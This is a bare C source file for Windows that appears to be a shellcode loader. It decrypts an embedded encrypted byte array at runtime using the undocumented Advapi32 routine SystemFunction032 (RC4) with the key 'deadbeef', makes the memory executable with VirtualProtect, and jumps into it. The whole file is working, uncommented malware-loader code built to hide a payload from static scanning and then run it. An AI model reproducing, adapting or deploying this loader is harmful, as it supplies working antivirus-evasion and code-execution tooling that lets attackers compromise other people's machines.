#include <Windows.h>
#include <stdio.h>

const BYTE encrypted_payload[] = {
0xfc,0x50,0xd2,0x1b,0x0c,0x24,0xd2,0xd2,0xeb,0xa3,0xb6,0x69,0x37,0xf8,0x9c,0x6e,0xe3,0x8b,
0x1e,0xb7,0x0f,0xc3,0xc0,0xff,0xbd,0x8a,0xd0,0x2a,0x5a,0x2a,0x55,0xd6,0x95,0x26,0xcc,0x29,
0x0d,0x63,0x84,0x88,0x4e,0x28,0xe9,0x5e,0x66,0xe8,0x72,0x55,0x8b,0xad,0x37,0x51,0x49,0xc4,
0x39,0xb7,0x0e,0x33,0x74,0x9c,0x30,0xcf,0x33,0x6c,0xd6,0x16,0xf2,0x00,0xc6,0x09,0xef,0xb6,
0x04,0x0e,0xbb,0x6e,0x33,0x48,0xc1,0x28,0x53,0x9a,0x42,0x8a,0xf5,0x40,0x3c,0x46,0x29,0x61,
0x2a,0xde,0x57,0x0d,0xd9,0x43,0x74,0x57,0x03,0x4c,0xa2,0x0c,0x6b,0xc6,0x57,0x17,0x5e,0x94,
0x3a,0x01,0x0a,0xc1,0x74,0xa1,0x5c,0x38,0xc8,0xdd,0x35,0x13,0xd7,0x9e,0x88,0xf2,0xad,0xa0,
0x91,0xa3,0xf7,0xc9,0xe3,0x7b,0x9d,0x72,0xc4,0x80,0x9c,0x5e,0x12,0x46,0xe3,0x06,0x5d,0x3f,
0xfc,0x0b,0x3f,0x7c,0xeb,0xbf,0xb0,0x19,0x9c,0x29,0xe9,0x5b,0xa1,0x89,0xd4,0x69,0xd3,0xb7,
0x7a,0xab,0x01,0x35,0x50,0x42,0x45,0xb8,0x51,0xec,0x4a,0x68,0xf0,0x4a,0x6f,0xd1,0x19,0x5c,
0x4f,0xff,0x56,0xa8,0xfc,0x2b,0x67,0xff,0x72,0x3b,0x79,0x69,0x77,0x4d,0x4c,0x23,0xf2,0x66,
0x23,0xc9,0x2d,0x6b,0x08,0x6d,0x34,0x06,0xff,0x96,0x2e,0x2c,0x0a,0x46,0xa7,0x20,0x27,0xec,
0xac,0x15,0x1a,0x02,0x47,0x34,0xd9,0x3a,0xa7,0x03,0xe0,0x24,0x43,0x09,0xa6,0x02,0x5f,0xed,
0x00,0xe4,0xc6,0x3d,0xe2,0x42,0x77,0xa7,0xeb,0xf8,0x1d,0x60,0xf7,0xfe,0x84,0xf8,0x48,0xb2,
0x9e,0x83,0x1b,0xb8,0x01,0xd0,0x28,0x1a,0x58,0x89,0x8d,0xcd,0xa3,0x44,0x16,0x70,0xb5,0x21,
0x04,0x2c,0x45,0x66,0x03,0xc5};

typedef struct {
	DWORD	Length;
	DWORD	MaximumLength;
	PVOID	Buffer;
} USTRING;

typedef NTSTATUS (NTAPI* fnSystemFunction032)(USTRING* data, USTRING* key);

typedef VOID PAYLOAD(VOID);

INT main(void) {
    fnSystemFunction032 SystemFunction032 = (fnSystemFunction032)(VOID*)GetProcAddress(LoadLibrary("Advapi32"), "SystemFunction032");

    if (SystemFunction032 == NULL) {
        printf("GetProcAddress failed with error code 0x%lx\n", GetLastError());
        return -1;
    }

    PVOID payload_buff = VirtualAlloc(NULL, sizeof(encrypted_payload), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);

    if (payload_buff == NULL) {
		printf("VirtualAlloc failed with error code 0x%lx\n", GetLastError());
		return -2;
	}

    CopyMemory(payload_buff, encrypted_payload, sizeof(encrypted_payload));

    USTRING data = {
        .Buffer = payload_buff,
        .Length = sizeof(encrypted_payload),
        .MaximumLength = sizeof(encrypted_payload)
    };

    BYTE key_array[] = {'d','e','a','d','b','e','e','f'};

    USTRING key = {
        .Buffer = key_array,
        .Length = sizeof(key_array),
        .MaximumLength = sizeof(key_array)
    };

    NTSTATUS STATUS = SystemFunction032(&data, &key);

    if(STATUS != 0) {
        printf("SystemFunction032 failed with error 0x%lx", STATUS);
        return -3;
    }

    DWORD old_protections;

    if ( !VirtualProtect(payload_buff, sizeof(encrypted_payload), PAGE_EXECUTE_READ, &old_protections) ) {
        printf("VirtualProtect failed with error code 0x%lx\n", GetLastError());
        return -4;
    }

    PAYLOAD* payload = (PAYLOAD*)payload_buff;

    payload();

    return 0;
}